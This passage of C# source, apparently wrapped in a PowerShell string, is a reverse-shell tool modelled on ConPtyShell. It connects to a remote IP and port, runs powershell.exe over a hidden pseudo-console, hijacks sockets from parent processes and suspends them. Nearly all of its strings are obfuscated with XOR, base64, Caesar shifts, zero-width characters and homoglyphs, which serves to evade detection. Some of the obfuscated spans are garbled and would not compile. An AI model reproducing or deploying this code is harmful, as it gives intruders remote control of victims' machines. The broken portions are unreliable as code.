    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
    {
        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
        IntPtr hStdout = CreateFile($($k3979=8;$b=[byte[]](0x4b,0x47,0x46,0x47,0x5d,0x5c,0x2c);-join($b|%{[char]($_-bxor$k3979)})), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        IntPtr hStdin = CreateFile(([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x4F,0x4E,0x49,0x4E,0x24))), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
        SetStdHandle(STD_ERROR_HANDLE, hStdout);
        SetStdHandle(STD_INPUT_HANDLE, hStdin);
    }

    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
    {
        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
    }

    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = 0;
        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!GetConsoleMode(hStdOut, out outConsoleMode))
        {
            throw new CPTSHException(('Cou'+'ld not '+'get co'+'n'+'sole'+' m'+'o'+'d'+'e'));
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new CPTSHException($($k9060='xa^z7JjB3';$b=[byte[]](0x3B,0x0E,0x2B,0x16,0x53,0x6A,0x04,0x2D,0x47,0x58,0x04,0x30,0x1B,0x55,0x26,0x0F,0x62,0x45,0x11,0x13,0x2A,0x0F,0x56,0x26,0x4A,0x36,0x56,0x0A,0x0C,0x37,0x14,0x56,0x26,0x4A,0x32,0x41,0x17,0x02,0x3B,0x09,0x44,0x23,0x04,0x25);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9060);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})));
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        EnableVirtualTerminalSequenceProcessing();
        COORD consoleCoord = new COORD();
        consoleCoord.X = (short)cols;
        consoleCoord.Y = (short)rows;
        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }

    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        if (success || lpSize == IntPtr.Zero)
        {
            throw new CPTSHException(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q291bGQgbm90IGNhbGN1bGF0ZSB0aGUgbnVtYmVyIG9mIGJ5dGVzIGZvciB0aGUgYXR0cmlidXRlIGxpc3QuIA=='))) + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
        if (!success)
        {
            throw new CPTSHException(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q291bGQgbm90IHNldCB1cCBhdHRyaWJ1dGUgbGlzdC4g'))) + Marshal.GetLastWin32Error());
        }
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        if (!success)
        {
            throw new CPTSHException($(-join('Htzqi sty xjy uxjzithtsxtqj ymwjfi fyywngzyj. '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }

    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        int securityAttributeSize = Marshal.SizeOf(pSec);
        pSec.nLength = securityAttributeSize;
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        tSec.nLength = securityAttributeSize;
        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (!success)
        {
            throw new CPTSHException("$([char]0x43)$([char]0x6F)$([char]0x75)$([char]0x6C)$([char]0x64)$([char]0x20)$([char]0x6E)$([char]0x6F)$([char]0x74)$([char]0x20)$([char]0x63)$([char]0x72)$([char]0x65)$([char]0x61)$([char]0x74)$([char]0x65)$([char]0x20)$([char]0x70)$([char]0x72)$([char]0x6F)$([char]0x63)$([char]0x65)$([char]0x73)$([char]0x73)$([char]0x2E)$([char]0x20)" + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }

    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
    {
        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
        return processInfo;
    }

    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
        } while (bytesSent > 0 && readSuccess);
        // Console.WriteLine(('debu'+'g: '+'byt'+'esSen'+'t = ') + bytesSent + (' W'+'SAG'+'etLastEr'+'ror()'+' '+'='+' ') + WSAGetLastError().ToString());
    }

    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            // Console.WriteLine((-join('debug',' ','Th','rea','dReadP','ipeWri','teSocke','t ','R','eadFile',': ','dwB','ytesRea','d',' ','=',' ')) + dwBytesRead + $($k7468='ngN6ICzg';$b=[byte[]](0x4E,0x2A,0x2F,0x44,0x3A,0x2B,0x1B,0x0B,0x40,0x20,0x2B,0x42,0x05,0x22,0x09,0x13,0x39,0x0E,0x20,0x05,0x7B,0x06,0x08,0x15,0x01,0x15,0x66,0x1F,0x69);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7468);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + Marshal.GetLastWin32Error());
            do
            {
                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
                // Console.WriteLine($(-join('stqjv IwgtpsGtpsExetLgxitHdrzti htcs: qnithHtci = '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) + bytesSent + $(-join(' QMUAynFumnYllil() = '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) + WSAGetLastError().ToString());
            } while (WSAGetLastError() == WSAEWOULDBLOCK);
        } while (bytesSent > 0 && readSuccess);
    }

    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
    {
        object[] threadParameters = new object[2];
        threadParameters[0] = OutputPipeRead;
        threadParameters[1] = shellSocket;
        Thread thThreadReadPipeWriteSocket;
        if(overlappedSocket)
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
        else
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }

    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
        } while (nBytesReceived > 0 && writeSuccess);
        //  Console.WriteLine(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZGVidWc6IG5CeXRlc1JlY2VpdmVkID0g'))) + nBytesReceived + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x57,0x53,0x41,0x47,0x65,0x74,0x4C,0x61,0x73,0x74,0x45,0x72,0x72,0x6F,0x72,0x28,0x29,0x20,0x3D,0x20))) + WSAGetLastError().ToString());
        TerminateProcess(hChildProcess, 0);
    }

    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        bool socketBlockingOperation = false;
        IntPtr wsaReadEvent = WSACreateEvent();
        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            // we still check WSAEWOULDBLOCK for a more robust implementation
            if (WSAGetLastError() == WSAEWOULDBLOCK)
            {
                socketBlockingOperation = true;
                continue;
            }
            WSAResetEvent(wsaReadEvent);
            socketBlockingOperation = false;
            // Console.WriteLine('d‌e‌b​u​g‌:‍ ‌T‌h​r‍e​a‍d​R‌e‍a​d​S​o​c‌k‌e‍t​W‍r‌i‌t‌e‍P‌i​p​e​ ‌r​e​c‍v‌:‌ ‍n‍B​y​t‍e​s​R‍e​c‌e​i​v​e‍d‌ ​=‍ ‍' + nBytesReceived + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IFdTQUdldExhc3RFcnJvcigpID0g'))) + WSAGetLastError().ToString());
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
            // Console.WriteLine(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZGVidWcgVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZSBXcml0ZUZpbGU6IGJ5dGVzV3JpdHRlbiA9IA=='))) + bytesWritten + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x4D,0x61,0x72,0x73,0x68,0x61,0x6C,0x2E,0x47,0x65,0x74,0x4C,0x61,0x73,0x74,0x57,0x69,0x6E,0x33,0x32,0x45,0x72,0x72,0x6F,0x72,0x28,0x29,0x20,0x3D,0x20))) + Marshal.GetLastWin32Error());
        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
        WSACloseEvent(wsaReadEvent);
        TerminateProcess(hChildProcess, 0);
    }

    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
    {
        object[] threadParameters = new object[3];
        threadParameters[0] = InputPipeWrite;
        threadParameters[1] = shellSocket;
        threadParameters[2] = hChildProcess;
        Thread thReadSocketWritePipe;
        if(overlappedSocket)
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
        else
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }

    public static string SpawnCPTSH(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        IntPtr shellSocket = IntPtr.Zero;
        IntPtr InputPipeRead = IntPtr.Zero;
        IntPtr InputPipeWrite = IntPtr.Zero;
        IntPtr OutputPipeRead = IntPtr.Zero;
        IntPtr OutputPipeWrite = IntPtr.Zero;
        IntPtr handlePseudoConsole = IntPtr.Zero;
        IntPtr oldStdIn = IntPtr.Zero;
        IntPtr oldStdOut = IntPtr.Zero;
        IntPtr oldStdErr = IntPtr.Zero;
        bool newConsoleAllocated = false;
        bool parentSocketInherited = false;
        bool grandParentSocketInherited = false;
        bool conptyCompatible = false;
        bool IsSocketOverlapped = true;
        string output = '';
        Process currentProcess = null;
        Process parentProcess = null;
        Process grandParentProcess = null;
        if (GetProcAddress(GetModuleHandle(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzI=')))), $(-join('ShuqjuFiukteSediebu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}}))) != IntPtr.Zero)
            conptyCompatible = true;
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        // comment the below function to debug errors
        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
        // init wsastartup stuff for this thread
        InitWSAThread();
        if (conptyCompatible)
        {
            Console.WriteLine('\‍r​\‌n‍C‌r‍e‍a‌t​e​P‍s‍e‌u‍d‌o‌C‍o‌n‍s​o‍l‍e‍ ‌f‌u‍n​c‍t‌i‌o‌n‍ ​f‍o‌u‍n​d​!​ ‌S‌p‌a​w​n​i‌n​g‌ ‍a‌ ‍f​u‌l​l‍y‍ ‌i‍n​t‍e‍r‌a‌c‌t​i​v‍e‌ ​s‍h​e​l‌l‍\‍r​\​n‍');
            if (upgradeShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                currentProcess = Process.GetCurrentProcess();
                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                // try to duplicate the socket for the current process
                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    // if no sockets are found in the current process we try to hijack our current parent process socket
                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shellSocket == IntPtr.Zero)
                        {
                            throw new CPTSHException("$([char]0x4E)$([char]0x6F)$([char]0x20)$([char]0x5C)$([char]0x5C)$([char]0x44)$([char]0x65)$([char]0x76)$([char]0x69)$([char]0x63)$([char]0x65)$([char]0x5C)$([char]0x5C)$([char]0x41)$([char]0x66)$([char]0x64)$([char]0x20)$([char]0x6F)$([char]0x62)$([char]0x6A)$([char]0x65)$([char]0x63)$([char]0x74)$([char]0x73)$([char]0x20)$([char]0x66)$([char]0x6F)$([char]0x75)$([char]0x6E)$([char]0x64)$([char]0x2E)$([char]0x20)$([char]0x53)$([char]0x6F)$([char]0x63)$([char]0x6B)$([char]0x65)$([char]0x74)$([char]0x20)$([char]0x64)$([char]0x75)$([char]0x70)$([char]0x6C)$([char]0x69)$([char]0x63)$([char]0x61)$([char]0x74)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x20)$([char]0x66)$([char]0x61)$([char]0x69)$([char]0x6C)$([char]0x65)$([char]0x64)$([char]0x2E)");
                        }
                        else
                        {
                            grandParentSocketInherited = true;
                        }
                    }
                    else
                    {
                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                        parentSocketInherited = true;
                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                    }
                }
                else
                {
                    // the current process got a usable socket, let's see if the parents use the socket
                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
            {
                shellSocket = connectRemote(remoteIp, remotePort);
                if (shellSocket == IntPtr.Zero)
                {
                    output += string.Format(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ezB9Q291bGQgbm90IGNvbm5lY3QgdG8gaXAgezF9IG9uIHBvcnQgezJ9'))), errorString, remoteIp, remotePort.ToString());
                    return output;
                }
                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
            }
            if (GetConsoleWindow() == IntPtr.Zero)
            {
                AllocConsole();
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                newConsoleAllocated = true;
            }
            // debug code for checking handle duplication
            // Console.WriteLine((-join('debug:',' Cr','eat','ing',' ps','eu','do conso','l','e..','.')));
            // Thread.Sleep(180000);
            // return '';
            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
            if (pseudoConsoleCreationResult != 0)
            {
                output += string.Format('{0}Could not create psuedo console. Error Code {1}', errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
        }
        else
        {
            if (upgradeShell)
            {
                output += string.Format($($k9995=182;$b=[byte[]](0xf5,0xd9,0xc3,0xda,0xd2,0x96,0xd8,0xd9,0xc2,0x96,0xc3,0xc6,0xd1,0xc4,0xd7,0xd2,0xd3,0x96,0xc5,0xde,0xd3,0xda,0xda,0x96,0xc2,0xd9,0x96,0xd0,0xc3,0xda,0xda,0xcf,0x96,0xdf,0xd8,0xc2,0xd3,0xc4,0xd7,0xd5,0xc2,0xdf,0xc0,0xd3,0x96,0xd4,0xd3,0xd5,0xd7,0xc3,0xc5,0xd3,0x96,0xf5,0xd9,0xd8,0xe6,0xe2,0xef,0x96,0xdf,0xc5,0x96,0xd8,0xd9,0xc2,0x96,0xd5,0xd9,0xdb,0xc6,0xd7,0xc2,0xdf,0xd4,0xda,0xd3,0x96,0xd9,0xd8,0x96,0xc2,0xde,0xdf,0xc5,0x96,0xc5,0xcf,0xc5,0xc2,0xd3,0xdb);-join($b|%{[char]($_-bxor$k9995)})));
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
            {
                output += string.Format('{0}Could not connect to ip {1} on port {2}', errorString, remoteIp, remotePort.ToString());
                return output;
            }
            Console.WriteLine(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XHJcbkNyZWF0ZVBzZXVkb0NvbnNvbGUgZnVuY3Rpb24gbm90IGZvdW5kISBTcGF3bmluZyBhIG5ldGNhdC1saWtlIGludGVyYWN0aXZlIHNoZWxsLi4uXHJcbg=='))));
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
            sInfo.hStdInput = InputPipeRead;
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
            CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }
        // Note: We can close the handles to the PTY-end of the pipes here
        // because the handles are dup'ed into the ConHost and will be released
        // when the ConPTY is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (upgradeShell) {
            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
        }
        //Threads have better performance than Tasks
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
        // wait for the child process until exit
        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
        //cleanup everything
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        if (upgradeShell)
        {
            if (!IsSocketOverlapped)
            {
                // cancelling the event selection for the socket
                WSAEventSelect(shellSocket, IntPtr.Zero, 0);
                SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
            }
            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
        }
        closesocket(shellSocket);
        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
        if (newConsoleAllocated)
            FreeConsole();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
        output += $($k4303=')L[8g#uYS';$b=[byte[]](0x6A,0x23,0x35,0x68,0x13,0x5A,0x26,0x31,0x36,0x45,0x20,0x7B,0x53,0x0E,0x4D,0x11,0x35,0x2A,0x09,0x29,0x23,0x51,0x13,0x46,0x11,0x77,0x0F,0x5B,0x10,0x35);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4303);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}));
        return output;
    }
}

public static class CPTSHMainClass
{
    private static string help = @"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ow0KDQogICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBIZWxwUmVxdWlyZWQoc3RyaW5nIHBhcmFtKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHBhcmFtID09IA==')))-h" || param == '-‍-‍h‍e​l‌p​' || param == ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Lz8=')));
    }

    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new CPTSHException(('\r\'+'n'+'Co'+'nPtySh'+'ell: '+'N'+'ot e'+'n'+'ough ar'+'gum'+'ents. 2 '+'A'+'rgu'+'me'+'nts re'+'quire'+'d. Us'+'e -'+'-help '+'for ad'+'ditiona'+'l he'+'l'+'p.\r\'+'n'));
    }

    private static void DisplayHelp()
    {
        Console.Out.Write(help);
    }

    private static string CheckRemoteIpArg(string ipString)
    {
        IPAddress address;
        if (!IPAddress.TryParse(ipString, out address))
            throw new CPTSHException('\r\nСоnРtуShеll: Invаlіd rеmоtеIр vаluе' + ipString);
        return ipString;
    }

    private static int CheckInt(string arg)
    {
        int ret = 0;
        if (!Int32.TryParse(arg, out ret))
            throw new CPTSHException(([System.Text.Encoding]::UTF8.GetString([byte[]](0x5C,0x72,0x5C,0x6E,0x43,0x6F,0x6E,0x50,0x74,0x79,0x53,0x68,0x65,0x6C,0x6C,0x3A,0x20,0x49,0x6E,0x76,0x61,0x6C,0x69,0x64,0x20,0x69,0x6E,0x74,0x65,0x67,0x65,0x72,0x20,0x76,0x61,0x6C,0x75,0x65,0x20))) + arg);
        return ret;
    }

    private static uint ParseRows(string[] arguments)
    {
        uint rows = 24;
        if (arguments.Length > 2)
            rows = (uint)CheckInt(arguments[2]);
        return rows;
    }

    private static uint ParseCols(string[] arguments)
    {
        uint cols = 80;
        if (arguments.Length > 3)
            cols = (uint)CheckInt(arguments[3]);
        return cols;
    }

    private static string ParseCommandLine(string[] arguments)
    {
        string commandLine = $(-join('cbjrefuryy.rkr'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}));
        if (arguments.Length > 4)
            commandLine = arguments[4];
        return commandLine;
    }

    public static string CPTSHMain(string[] args)
    {
        string output = '';
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            DisplayHelp();
        }
        else
        {
            string remoteIp = '';
            int remotePort = 0;
            bool upgradeShell = false;
            try
            {
                CheckArgs(args);
                if (args[0].Contains(('{0}{1}{2}' -f 'upgr','ad','e')))
                    upgradeShell = true;
                else
                {
                    remoteIp = CheckRemoteIpArg(args[0]);
                    remotePort = CheckInt(args[1]);
                }
                uint rows = ParseRows(args);
                uint cols = ParseCols(args);
                string commandLine = ParseCommandLine(args);
                output = CPTSH.SpawnCPTSH(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XG4='))) + e.ToString() + $($k2638=170;$b=[byte[]](0xf6,0xc4);-join($b|%{[char]($_-bxor$k2638)})));
            }
        }
        return output;
    }
}


class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(CPTSHMainClass.CPTSHMain(args));
    }
}

";
